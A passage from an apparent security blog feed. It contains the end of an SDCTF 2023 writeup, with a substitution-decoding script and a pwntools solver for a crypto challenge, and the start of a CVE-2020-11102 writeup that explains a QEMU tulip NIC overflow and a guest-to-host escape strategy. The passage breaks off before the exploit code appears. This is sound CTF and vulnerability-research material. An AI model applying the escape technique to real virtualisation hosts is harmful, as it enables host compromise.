pattern xxxIxxxxxIxxxxxIxxxIxxxxxIxxxxIxxxIxxxxIxxx</span></span><br><span class="line">            <span class="comment"># I is a printable character</span></span><br><span class="line">            <span class="comment"># x is arbitrary character</span></span><br><span class="line">            regex = <span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span></span><br><span class="line">            match = re.search(regex, code)</span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">and</span> I == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="built_in">print</span>(I)</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="comment"># get the matched string</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;found&quot;</span>)</span><br><span class="line">    origin = <span class="string">&quot;the_quick_brown_fox_jumps_over_the_lazy_dog&quot;</span></span><br><span class="line">    encoded = match.group()</span><br><span class="line">    span = match.span()</span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin)):</span><br><span class="line">        key[encoded[i]] = origin[i]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        e = f.read()</span><br><span class="line">        encoded = <span class="string">&quot;&#x27;: 123456789.0, &#x27;items&#x27;:[]&#125;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encoded):</span><br><span class="line">            key[e[i+span[<span class="number">1</span>]]] = encoded[i]</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">    key[<span class="string">&#x27;y&#x27;</span>] = <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;]&#x27;</span>] = <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;b&#x27;</span>] = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;J&#x27;</span>] = <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;^&#x27;</span>] = <span class="string">&#x27;(&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;g&#x27;</span>] = <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;.&#x27;</span>] = <span class="string">&#x27;#&#x27;</span></span><br><span class="line">    key[<span class="string">&#x27;=&#x27;</span>] = <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">len</span>(key), <span class="built_in">len</span>(string.printable))</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    origin = <span class="string">&quot;&#123;&#x27;the_quick_brown_fox_jumps_over_the_lazy_dog&#x27;:&quot;</span></span><br><span class="line">    check_doc = <span class="string">&quot;&quot;&quot;F+</span></span><br><span class="line"><span class="string">_f5&#125;I_7|0_17s+_B&amp;N)K_n+(_,O+1q_CQ*)`_7|0&quot;&quot;&quot;</span></span><br><span class="line">    check_doc = <span class="built_in">list</span>(<span class="built_in">reversed</span>(check_doc))</span><br><span class="line">    origin_upper = origin.upper()[<span class="number">2</span>:<span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin_upper)):</span><br><span class="line">        <span class="keyword">if</span> check_doc[i] <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            key[check_doc[i]] = origin_upper[i]</span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;check doc len=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(check_doc)))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        e = f.read()</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> e:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> key:</span><br><span class="line">                data += key[c]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data += c</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>And finally we can have the flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo c2RjdGZ7VV91blJhdjNsZWRfdEgzX3NuM2shfQ== | base64 -d</span><br><span class="line">sdctf&#123;U_unRav3led_tH3_sn3k!&#125;</span><br></pre></td></tr></table></figure><h3 id="Lake-of-Pseudo-Random-Fire">Lake of Pseudo Random Fire</h3><p>Notice that <code>pseudorandom(self, msg)</code> will decrypt the <code>msg</code> after XOR with <code>0xff</code>. So by XORing the first part of the returned strings of <code>pseudorandom(self, msg)</code> we can recover the <code>msg</code> sent by us if it is a pseudorandom door.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./game.py&quot;</span>])</span><br><span class="line">sh = remote(<span class="string">&quot;prf.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;round: &quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    data = <span class="string">b&#x27;00000000000000000000000000000000&#x27;</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;utter: &#x27;</span>, data)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door1 = sh.recv(<span class="number">64</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door2 = sh.recv(<span class="number">64</span>)</span><br><span class="line">    </span><br><span class="line">    binascii.hexlify(<span class="built_in">bytes</span>(x ^ <span class="number">0xff</span> <span class="keyword">for</span> x <span class="keyword">in</span> binascii.unhexlify(door1[:<span class="number">32</span>])))</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;utter: &#x27;</span>, binascii.hexlify(<span class="built_in">bytes</span>(x ^ <span class="number">0xff</span> <span class="keyword">for</span> x <span class="keyword">in</span> binascii.unhexlify(door1[:<span class="number">32</span>]))))</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door1 = sh.recv(<span class="number">64</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;sings: &quot;</span>)</span><br><span class="line">    door2 = sh.recv(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">in</span> door1:</span><br><span class="line">        sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.sendlineafter(<span class="string">b&#x27;number: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;SDCTF 2023 Writeup&lt;/h1&gt;
&lt;p&gt;I was so excited to participate in my first SDCTF event as an incoming student of UC San Diego. :-) It was a </summary>
      
    
    
    
    
    <category term="Writeup" scheme="https://kpwnz.github.io/tags/Writeup/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-11102: Escape from the Earth</title>
    <link href="https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/"/>
    <id>https://kpwnz.github.io/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/</id>
    <published>2023-04-25T07:50:54.000Z</published>
    <updated>2023-04-25T05:11:07.113Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2020-11102: Escape from the Earth</h1><h2 id="Introduction">Introduction</h2><p>I participated in the Aliyun CTF competition recently and solved an interesting challenge based on CVE-2020-11102, which is a vulnerability in qemu that allows guest OS to escape and execute arbitrary code on the host OS. In this article, I would like to share some detail about the challenge and what I learned from it.</p><h2 id="The-vulnerability">The vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_copy_tx_buffers</span><span class="params">(TULIPState *s, struct tulip_descriptor *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = (desc-&gt;control &gt;&gt; TDES1_BUF1_SIZE_SHIFT) &amp; TDES1_BUF1_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len2 = (desc-&gt;control &gt;&gt; TDES1_BUF2_SIZE_SHIFT) &amp; TDES1_BUF2_SIZE_MASK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len1) &#123;</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr1,</span><br><span class="line">            s-&gt;tx_frame + s-&gt;tx_frame_len, len1);</span><br><span class="line">        s-&gt;tx_frame_len += len1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len2) &#123;</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, desc-&gt;buf_addr2,</span><br><span class="line">            s-&gt;tx_frame + s-&gt;tx_frame_len, len2);</span><br><span class="line">        s-&gt;tx_frame_len += len2;</span><br><span class="line">    &#125;</span><br><span class="line">    desc-&gt;status = (len1 + len2) ? <span class="number">0</span> : <span class="number">0x7fffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Take a look at <code>tulip_copy_tx_buffers()</code> first. It copies the <code>desc-&gt;buf_addr1</code> to the <code>tx_frame + s-&gt;tx_frame_len</code>. Notice that there is no check for the <code>s-&gt;tx_frame_len</code> as well as the <code>len1</code>. And <code>s-&gt;tx_frame_len</code> will be increased by <code>len1</code> after copying. When we call this function multiple times, the <code>s-&gt;tx_frame_len</code> can be increased to a very large value, which can cause a buffer overflow.</p><p>The same applies to <code>tulip_copy_rx_bytes()</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tulip_copy_rx_bytes</span><span class="params">(TULIPState *s, struct tulip_descriptor *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = (desc-&gt;control &gt;&gt; RDES1_BUF1_SIZE_SHIFT) &amp; RDES1_BUF1_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len2 = (desc-&gt;control &gt;&gt; RDES1_BUF2_SIZE_SHIFT) &amp; RDES1_BUF2_SIZE_MASK;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;rx_frame_len &amp;&amp; len1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_frame_len &gt; len1) &#123;</span><br><span class="line">            len = len1;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len = s-&gt;rx_frame_len;</span><br><span class="line">        &#125;</span><br><span class="line">        pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr1, s-&gt;rx_frame +</span><br><span class="line">            (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">        s-&gt;rx_frame_len -= len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;rx_frame_len &amp;&amp; len2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;rx_frame_len &gt; len2) &#123;</span><br><span class="line">            len = len2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len = s-&gt;rx_frame_len;</span><br><span class="line">        &#125;</span><br><span class="line">        pci_dma_write(&amp;s-&gt;dev, desc-&gt;buf_addr2, s-&gt;rx_frame +</span><br><span class="line">            (s-&gt;rx_frame_size - s-&gt;rx_frame_len), len);</span><br><span class="line">        s-&gt;rx_frame_len -= len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>tulip_copy_rx_bytes()</code> function copies the <code>s-&gt;rx_frame</code> to the <code>desc-&gt;buf_addr1</code>. And there is no check for the <code>s-&gt;rx_frame_len</code> and <code>s-&gt;rx_frame_size</code>. This results in possible memory disclosure.</p><h2 id="Exploitation">Exploitation</h2><h3 id="Leak-something-first">Leak something first</h3><p>To leak QEMU base address and heap address we need to control <code>s-&gt;rx_frame_size</code> and <code>s-&gt;rx_frame_len</code>. Consider the following code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TULIPState</span> &#123;</span></span><br><span class="line">    PCIDevice dev;</span><br><span class="line">    MemoryRegion io;</span><br><span class="line">    MemoryRegion memory;</span><br><span class="line">    NICConf c;</span><br><span class="line">    qemu_irq irq;</span><br><span class="line">    NICState *nic;</span><br><span class="line">    <span class="keyword">eeprom_t</span> *eeprom;</span><br><span class="line">    <span class="keyword">uint32_t</span> csr[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* state for MII */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> old_csr9;</span><br><span class="line">    <span class="keyword">uint32_t</span> mii_word;</span><br><span class="line">    <span class="keyword">uint32_t</span> mii_bitcnt;</span><br><span class="line"></span><br><span class="line">    hwaddr current_rx_desc;</span><br><span class="line">    hwaddr current_tx_desc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> rx_frame[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> tx_frame[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">int</span> tx_frame_len;</span><br><span class="line">    <span class="keyword">int</span> rx_frame_len;</span><br><span class="line">    <span class="keyword">int</span> rx_frame_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> rx_status;</span><br><span class="line">    <span class="keyword">uint8_t</span> filter[<span class="number">16</span>][<span class="number">6</span>];</span><br><span class="line">&#125; TULIPState;</span><br></pre></td></tr></table></figure><p>The <code>tx_frame</code> is a fixed size buffer, which is 2048 bytes. By triggering <code>tulip_copy_tx_buffers()</code> multiple times, we can control <code>tx_frame_len</code>, <code>rx_frame_len</code> and <code>rx_frame_size</code>. Then we can call <code>tulip_copy_rx_bytes()</code> and copy the heap memory back to the user space of the guest OS. With some calculation, we can retrieve the QEMU base address and heap address very easily.</p><p>After leaking the memory, we need to figure out how to get arbitrary code exection within the context of QEMU. This piece of code caught my attention:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps tulip_ops = &#123;</span><br><span class="line">    .read = tulip_read,</span><br><span class="line">    .write = tulip_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>What if we can control the function pointer in <code>tulip_ops</code>? Unfortunately, the <code>tulip_ops</code> is  not writable.</p><p>When initializing the memory region of <code>TULIPState</code>, the pointer to <code>tulip_ops</code> will be assigned to <code>struct MemoryRegion.ops</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    memory_region_init_io(&amp;s-&gt;io, OBJECT(&amp;s-&gt;dev), &amp;tulip_ops, s,</span><br><span class="line">            <span class="string">&quot;tulip-io&quot;</span>, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;memory, OBJECT(&amp;s-&gt;dev), &amp;tulip_ops, s,</span><br><span class="line">            <span class="string">&quot;tulip-mem&quot;</span>, <span class="number">128</span>);</span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All fields are private - violators will be prosecuted */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="keyword">bool</span> romd_mode;</span><br><span class="line">    <span class="keyword">bool</span> ram;</span><br><span class="line">    <span class="keyword">bool</span> subpage;</span><br><span class="line">    <span class="keyword">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="keyword">bool</span> nonvolatile;</span><br><span class="line">    <span class="keyword">bool</span> rom_device;</span><br><span class="line">    <span class="keyword">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="keyword">bool</span> global_locking;</span><br><span class="line">    <span class="keyword">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="keyword">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    Int128 size;</span><br><span class="line">    hwaddr addr;</span><br><span class="line">    <span class="keyword">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="keyword">uint64_t</span> align;</span><br><span class="line">    <span class="keyword">bool</span> terminates;</span><br><span class="line">    <span class="keyword">bool</span> ram_device;</span><br><span class="line">    <span class="keyword">bool</span> enabled;</span><br><span class="line">    <span class="keyword">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;</span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="keyword">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>And <code>struct MemoryRegion</code> is allocated on the heap. So we can overwrite the <code>struct MemoryRegion.ops</code> with the address of <code>tx_frame</code> and craft a fake <code>struct MemoryRegionOps</code>.<br>Also, notice that the type of <code>tx_frame_len</code>, <code>rx_frame_len</code> and <code>rx_frame_size</code> are all <code>int</code>, which means we can write backward if we overwrite these fields with negative value.</p><h3 id="Exploitation-2">Exploitation</h3><p>The exploitation should be pretty straightforward and the comments in the code should be self-explanatory.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span 